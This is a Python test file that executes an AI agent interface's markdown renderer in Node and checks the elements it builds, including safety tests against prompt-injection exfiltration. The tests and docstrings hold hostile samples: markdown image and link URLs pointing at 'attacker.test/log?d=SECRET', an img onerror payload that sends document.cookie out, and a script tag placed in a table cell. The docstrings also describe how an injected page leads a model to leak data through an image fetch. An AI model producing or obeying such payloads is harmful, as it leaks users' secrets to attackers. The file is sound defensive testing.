"""What the answer pane MAKES of what the model wrote.

⛔ EVERY OTHER TEST OF THIS PAGE READS IT AS A STRING, and a string cannot say
what a renderer produces. That gap is not theoretical here: the pane understood
three inline marks and nothing else, so a model answering in headings and lists
- which is how a model answers - had `## Roles` drawn on screen as a hash, a
hash and a space, for the whole life of the interface. Every test was green,
because a scan for `function rich` finds a function and never asks what it
returns.

So this file RUNS it. The machine and every CI runner have node, so the region
between the two markers in the page is cut out and executed against a DOM small
enough to print, and the assertions are about the tree that comes back.

⛔ AND THE SECOND HALF IS THE ONE THAT MATTERS MOST. This pane draws words
chosen by whoever wrote the last page the agent visited: a page can address the
model directly, and the model can repeat it. If any of this ever reaches
innerHTML, `![](https://attacker/log?d=SECRET)` becomes an `<img>` that fetches
itself the moment it enters the document - no click, no script, no error
handler needed. That is the documented road (Slack AI 2024, GitLab Duo 2025,
EchoLeak 2025, Superhuman 2026) and the shim below closes it by force: assigning
innerHTML throws, and every tag the renderer creates is recorded so `img` and
`a` can be asserted absent rather than hoped absent.
"""
from __future__ import annotations

import json
import shutil
import subprocess

import pytest

from aihawk.web import PAGE

NODE = shutil.which("node")
FIRST = "const el = (t,c,x)"
LAST = "/* ---- end markdown ---- */"

#: A DOM with three methods and one rule. `innerHTML` is not merely absent: it
#: refuses, so a renderer that reached for it fails here by name instead of by
#: a downstream assertion that would read as a formatting bug.
SHIM = r"""
const MADE = [];
class Node {
  constructor(tag){ this.tag = tag; this.kids = []; this.className = ''; this._text = null; }
  get textContent(){
    return this._text != null ? this._text : this.kids.map(k => k.textContent).join('');
  }
  set textContent(v){ this._text = String(v); this.kids = []; }
  appendChild(n){
    if(this._text != null){ this.kids.push(new Txt(this._text)); this._text = null; }
    this.kids.push(n); return n;
  }
  append(...xs){ for(const x of xs) this.appendChild(typeof x === 'string' ? new Txt(x) : x); }
}
class Txt extends Node { constructor(t){ super('#text'); this._text = t; } }
Object.defineProperty(Node.prototype, 'innerHTML', {
  set(){ throw new Error('INNERHTML: this pane must build nodes, never parse HTML'); },
  get(){ return undefined; },
});
const document = {
  createElement: t => { MADE.push(t); return new Node(t); },
  createTextNode: t => new Txt(t),
  createDocumentFragment: () => new Node('#fragment'),
};
function tree(n){
  return n.tag === '#text'
    ? {tag: '#text', text: n._text, kids: []}
    : {tag: n.tag, cls: n.className,
       text: n._text, kids: n.kids.map(tree)};
}
"""


def draw(text: str) -> dict:
    """Run the page's own renderer over `text` and return the tree it built."""
    body = PAGE[PAGE.index(FIRST):PAGE.index(LAST)]
    js = (SHIM + body
          + "\nconst out = tree(rich(%s));" % json.dumps(text)
          + "\nprocess.stdout.write(JSON.stringify({tree: out, made: MADE}));")
    # ⛔ A DEADLINE, BECAUSE THE FAILURE THIS PARSER CAN HAVE IS NOT A WRONG
    # TREE, IT IS NO TREE. The walker advances only if some branch consumes a
    # line; one that consumed nothing would spin forever building empty
    # paragraphs, which in a browser is a frozen tab. Measured while mutating
    # the list branch away. Without the deadline the whole suite hangs there
    # instead of one test going red with a sentence.
    try:
        done = subprocess.run([NODE, "-e", js], capture_output=True, text=True,
                              encoding="utf-8", timeout=30)
    except subprocess.TimeoutExpired:
        raise AssertionError(
            "the renderer did not finish on %r: a block the walker recognises "
            "but no branch consumes leaves it on the same line forever, which "
            "in a browser is a page that stops responding" % text)
    assert done.returncode == 0, (
        "the answer pane's renderer threw while drawing %r:\n%s" % (text, done.stderr))
    return json.loads(done.stdout)


def tags(node, out=None):
    out = [] if out is None else out
    out.append(node["tag"])
    for k in node["kids"]:
        tags(k, out)
    return out


def find(node, tag):
    """Every node with this tag, depth first."""
    got = [node] if node["tag"] == tag else []
    for k in node["kids"]:
        got += find(k, tag)
    return got


def text_of(node) -> str:
    if node["tag"] == "#text" or node.get("text") is not None:
        return node["text"] or ""
    return "".join(text_of(k) for k in node["kids"])


pytestmark = pytest.mark.skipif(
    not NODE,
    reason="needs node to EXECUTE the page's renderer; without it this whole "
           "file is silent and the only cover left is a string scan")


def test_a_heading_becomes_a_heading_and_not_two_hashes():
    """The defect that started this: the pane drew the marks.

    Known-bad: delete the HEAD branch from `blocks`.
    """
    got = draw("## Roles")["tree"]
    heads = find(got, "h4")
    assert heads, "no heading element: %s" % tags(got)
    assert text_of(heads[0]) == "Roles"
    assert "#" not in text_of(got), "the hashes were drawn as characters"


def test_the_answer_never_outranks_the_page_it_is_drawn_in():
    """`#` lands on h3 because the interface's own title sits above this pane.

    Known-bad: `head[1].length` instead of `+ 2`, which puts an answer at h1.
    """
    assert find(draw("# Title")["tree"], "h3"), "a top heading must not be h1 or h2"
    assert find(draw("###### deep")["tree"], "h6")
    assert find(draw("####### deeper than markdown goes")["tree"], "h6") == [], (
        "seven hashes is not a heading in any markdown, and drawing one would "
        "invent a level the language does not have")


def test_a_dash_list_becomes_a_list():
    """Known-bad: drop the BULLET branch. Every bullet is then a paragraph and
    the dashes are drawn.
    """
    got = draw("- one\n- two\n- three")["tree"]
    items = find(got, "li")
    assert [text_of(i) for i in items] == ["one", "two", "three"]
    assert find(got, "ul"), "the items are not in a list"
    assert "- " not in text_of(got)


def test_a_numbered_list_keeps_its_numbers_from_the_browser():
    """⛔ AND NOT AS TEXT. An `ol` numbers itself, so a list that renumbers when
    the model miscounts is the correct one - and a list whose numbers are
    characters would show `1. 1. 1.` the day a model writes them all as one.

    Known-bad: build `ul` for both kinds; then the numbers vanish entirely,
    which is worse than drawing them.
    """
    got = draw("1. first\n2. second")["tree"]
    assert find(got, "ol"), "a numbered list must be an ol: %s" % tags(got)
    assert [text_of(i) for i in find(got, "li")] == ["first", "second"]


def test_the_two_kinds_of_list_do_not_merge():
    """A bulleted list followed by a numbered one is two lists.

    Known-bad: drop the `!== ordered` break; the numbered items then join the
    bulleted list and lose their numbering.
    """
    got = draw("- a\n1. b")["tree"]
    assert len(find(got, "ul")) == 1 and len(find(got, "ol")) == 1


def test_an_indented_list_nests_inside_its_item():
    """Known-bad: remove the `mark[1].length > base` branch. The nested items
    flatten into the parent list and the structure the model wrote is lost.
    """
    got = draw("- fruit\n  - apple\n  - pear\n- bread")["tree"]
    outer = find(got, "ul")[0]
    assert len(outer["kids"]) == 2, "the nested items were flattened into the parent"
    inner = find(outer["kids"][0], "ul")
    assert len(inner) == 1, "the nested list is not inside the item it belongs to"
    # The inner list's OWN items: `find` from the item would also return the
    # item, whose text contains everything below it.
    assert [text_of(i) for i in inner[0]["kids"]] == ["apple", "pear"]
    assert text_of(outer["kids"][1]) == "bread", "the outer list did not resume"


def test_a_table_becomes_a_table():
    """A model listing anything writes pipes, and pipe soup is the ugliest way
    this pane could fail.

    Known-bad: drop the DASHES condition; the header row is then a paragraph
    full of pipes and the rows never become cells.
    """
    got = draw("| Role | City |\n|---|---|\n| Engineer | Milan |\n| Analyst | Rome |")["tree"]
    assert find(got, "table"), "no table: %s" % tags(got)
    assert [text_of(h) for h in find(got, "th")] == ["Role", "City"]
    assert [text_of(d) for d in find(got, "td")] == ["Engineer", "Milan", "Analyst", "Rome"]
    assert "|" not in text_of(got)


def test_a_line_of_pipes_that_is_not_a_table_stays_a_sentence():
    """⛔ THE CASE THAT MUST NOT FIRE. A pipe is an ordinary character - a shell
    command, an or - and a gate that turned every line containing one into a
    table would be worse than the defect it fixes.
    """
    got = draw("Run `ls | wc -l` to count them.")["tree"]
    assert not find(got, "table")
    assert "|" in text_of(got)


def test_a_rule_is_a_rule_and_a_bullet_is_not():
    """`---` and `- item` start with the same character.

    Known-bad: loosen RULE from three marks to two. ⛔ THE FIRST VERSION OF THIS
    TEST SURVIVED THAT, because the case it offered was `a -- b`, which no
    version of the rule matches - it does not begin with the mark. The mutation
    was reaching the code and the gate was not blind: the CASE was exercising a
    different branch from the one it named. So the line below is the one the
    change actually moves, a line that is nothing but two dashes.
    """
    assert find(draw("---")["tree"], "hr")
    assert find(draw("***")["tree"], "hr")
    assert find(draw("- - -")["tree"], "hr")
    assert not find(draw("- item")["tree"], "hr"), "a bullet was drawn as a rule"
    assert not find(draw("a -- b")["tree"], "hr")
    assert not find(draw("--")["tree"], "hr"), (
        "two marks are not a rule in any markdown, and a line of two dashes is "
        "ordinary prose - a signature separator, a bare flag")


def test_a_quote_holds_blocks_and_not_just_letters():
    """Known-bad: `inline` instead of `blocks` inside the quote. A quoted list
    is then a quote with dashes in it.
    """
    got = draw("> Note this\n> - and this")["tree"]
    quote = find(got, "blockquote")
    assert quote, "no blockquote: %s" % tags(got)
    assert find(quote[0], "li"), "the list inside the quote stayed characters"
    assert ">" not in text_of(got)


def test_the_three_inline_marks_still_work():
    """They were the only ones that worked, and a block parser written over them
    is exactly the change that could take them away.
    """
    got = draw("A **bold** and *soft* and `typed` line")["tree"]
    assert text_of(find(got, "strong")[0]) == "bold"
    assert text_of(find(got, "em")[0]) == "soft"
    assert text_of(find(got, "code")[0]) == "typed"
    assert "*" not in text_of(got) and "`" not in text_of(got)


def test_a_fence_is_still_code_and_its_language_is_not_drawn():
    got = draw("before\n```python\nprint(1)\n```\nafter")["tree"]
    pre = find(got, "pre")
    assert pre and text_of(pre[0]).strip() == "print(1)", [text_of(p) for p in pre]
    assert "python" not in text_of(got)


def test_a_fence_that_never_closed_is_still_shown_as_code():
    """A half-written answer must not change shape when the closing fence
    arrives."""
    assert find(draw("here it comes\n```\nprint(1)")["tree"], "pre")


def test_marks_inside_a_block_are_read():
    """Known-bad: append the raw text to the item instead of calling `inline`."""
    got = draw("- a **bold** item\n- a `typed` one")["tree"]
    assert find(got, "strong") and find(got, "code")
    got = draw("## A **bold** heading")["tree"]
    assert find(got, "strong"), "the marks inside a heading were drawn as text"


def test_prose_is_left_alone():
    """⛔ THE CASE THAT MUST NOT FIRE, and the one a block parser gets wrong.
    Most of what this pane draws is a plain sentence."""
    got = draw("I am on example.com and the title is Example Domain.")["tree"]
    assert [k["tag"] for k in got["kids"]] == ["p"]
    assert text_of(got) == "I am on example.com and the title is Example Domain."


def test_a_blank_line_is_not_drawn_twice():
    """⛔ THE PRE-WRAP WAS ON THE CONTAINER, so the blank line the model leaves
    between two paragraphs used to be a drawn empty line. Now the parser eats it
    and the margin does the spacing - if the parser stopped eating it, every
    answer would be double spaced and nothing would fail.

    Known-bad: keep the blank lines in the paragraph text.
    """
    got = draw("one\n\ntwo")["tree"]
    assert [k["tag"] for k in got["kids"]] == ["p", "p"]
    assert text_of(got["kids"][0]) == "one" and text_of(got["kids"][1]) == "two"


def test_a_single_newline_still_breaks_the_line_where_the_model_put_it():
    """The other half of the same decision: inside a paragraph the break is the
    author's, and it survives as a newline for `white-space:pre-wrap` to draw.
    """
    assert text_of(draw("one\ntwo")["tree"]) == "one\ntwo"


# ---------------------------------------------------------------- the safety half

def test_the_pane_never_builds_an_image_or_a_link_element():
    """⛔ THE EXFILTRATION VECTOR, ASSERTED ON THE TAG AND NOT ON THE INTENT.
    An `<img>` fetches its source the instant it enters the document, so a
    model repeating `![](https://attacker/log?d=...)` from a page it just read
    would send that query with nobody clicking anything.

    Known-bad: render the image branch as `el('img')` with the url - which is
    exactly what every markdown library does, and what every product in the
    incident table did before it leaked.
    """
    got = draw("![](https://attacker.test/log?d=SECRET)\n\n"
               "[click me](https://attacker.test/go)")
    assert "img" not in got["made"], "the pane created an image element"
    assert "a" not in got["made"], "the pane created a link element"
    assert "iframe" not in got["made"] and "script" not in got["made"]


def test_an_injected_address_is_printed_where_a_person_can_see_it():
    """Hiding the destination behind words is the other half of the same
    problem: the address is what tells a person the answer has been got at.
    """
    got = draw("[the careers page](https://attacker.test/log?d=SECRET)")["tree"]
    assert "https://attacker.test/log?d=SECRET" in text_of(got)
    assert "the careers page" in text_of(got)
    assert "](" not in text_of(got), "the mark itself was drawn"


def test_html_in_the_answer_stays_letters():
    """It never stops being a text node, so it is drawn as the characters of a
    tag rather than becoming one.

    Known-bad: any innerHTML on the way in - the shim throws by name.
    """
    hostile = '<img src=x onerror="fetch(\'//attacker.test/\'+document.cookie)">'
    got = draw(hostile)
    assert "img" not in got["made"]
    assert text_of(got["tree"]) == hostile, "the answer was parsed instead of drawn"


def test_a_table_cell_cannot_smuggle_a_tag_either():
    """The cells go through the same `inline`, and a renderer that special-cased
    them would be the one place the invariant did not hold."""
    got = draw("| a | b |\n|---|---|\n| <script>x</script> | ok |")
    assert "script" not in got["made"]
    assert "<script>x</script>" in text_of(got["tree"])


def test_the_page_holds_no_innerhtml_at_all():
    """The gate above covers the renderer, which is where untrusted text goes.
    This one covers the file, because the next person to add a pane will copy
    whatever is nearest.

    ⛔ AND IT READS THE CODE, NOT THE COMMENTS BESIDE IT. Its first version was
    red on a correct file: the two places this page mentions `innerHTML` are
    comments explaining why it is never used, and a scan that cannot tell code
    from prose is a gate that goes red for the reason opposite to the one it was
    written for. This project has that failure written down in both directions.

    Known-bad: `e.innerHTML = x` in `el`, which the shim above also refuses.
    """
    import re

    script = PAGE[PAGE.index("<script"):]
    code = re.sub(r"/\*.*?\*/", "", script, flags=re.S)
    code = re.sub(r"(?m)^\s*//.*$", "", code)
    for name in ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write"):
        assert name not in code, (
            "the page uses %s, which parses text into markup: the answer pane "
            "draws words chosen by whatever page the agent last read" % name)


def test_the_whole_script_parses():
    """⛔ THREE TIMES IN THREE DAYS THIS PAGE SHIPPED DEAD, and every time the
    suite was green: a duplicate `let`, a top-level read before its declaration,
    a function removed from under a handler. Two of those are syntax, and a hand
    written scan for them is a guess at what a parser does.

    node is here, so this asks the real parser. It does not replace the two
    scans next door - a dead-zone read is a runtime error and parses fine - but
    it is the one that cannot be fooled by a shape nobody predicted.

    Known-bad: add `let turn = 0;` at the top level a second time.
    """
    script = PAGE[PAGE.index("<script"):]
    script = script[script.index(">") + 1:script.index("</script>")]
    # ⛔ utf-8 SPELLED OUT: the page's comments are not ASCII, and on Windows a
    # pipe opened with the console codepage dies on the first one - which reads
    # as the script being unparseable rather than as the harness being unable to
    # send it.
    done = subprocess.run([NODE, "--check"], input=script, capture_output=True,
                          text=True, encoding="utf-8")
    assert done.returncode == 0, (
        "the page's script does not parse, so a browser runs NONE of it and the "
        "page renders dead:\n%s" % done.stderr)
